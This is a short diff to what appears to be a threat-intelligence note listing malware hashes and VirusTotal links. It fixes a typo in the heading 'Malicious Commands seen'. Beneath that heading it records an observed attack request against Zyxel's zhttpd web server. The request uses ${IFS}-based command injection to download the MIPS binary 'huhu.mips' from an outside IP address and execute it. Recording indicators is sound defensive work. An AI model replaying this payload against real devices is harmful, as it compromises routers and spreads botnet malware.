@@ -14,7 +14,7 @@ https://www.virustotal.com/gui/file/1cee8d8c999f5882e2d3f3da3ae3ebe9ef3435aa8b7f
 bb082371dda8263a989d33811f6ee1e89a19183015307c7c16f198fe4bea95dd
 https://www.virustotal.com/gui/file/bb082371dda8263a989d33811f6ee1e89a19183015307c7c16f198fe4bea95dd
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 GET /bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://103.180.149.156/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;
 
